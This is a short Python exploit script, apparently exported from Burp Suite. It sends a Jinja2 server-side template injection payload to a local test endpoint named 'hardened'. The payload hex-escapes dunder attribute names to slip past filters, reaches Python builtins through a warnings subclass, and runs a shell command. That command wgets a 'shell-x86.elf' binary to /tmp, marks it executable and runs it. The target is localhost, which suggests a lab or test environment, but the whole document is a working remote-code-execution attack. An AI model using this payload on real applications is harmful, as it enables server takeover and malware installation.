import requests

burp0_url = "http://localhost:6080/hardened"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Content-Type": "application/x-www-form-urlencoded"}
burp0_data = {"name": "\r\n{% for x in ()|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5fbase\\x5f\\x5f')|attr('\\x5f\\x5fsubclasses\\x5f\\x5f')() %}\r\n{% if \"warning\" in x|attr('\\x5f\\x5fname\\x5f\\x5f') %}\r\n{% set y = x()|attr('\\x5fmodule')|attr('\\x5f\\x5fbuiltins\\x5f\\x5f') %}\r\n{{y['\\x5f\\x5fimport\\x5f\\x5f']('os').system('wget http://127.0.0.1/jinja-ssti-test-env/shell-x86.elf -O /tmp/test; chmod +x /tmp/test; /tmp/test')}}\r\n{% endif %}\r\n{% endfor %}"}
requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
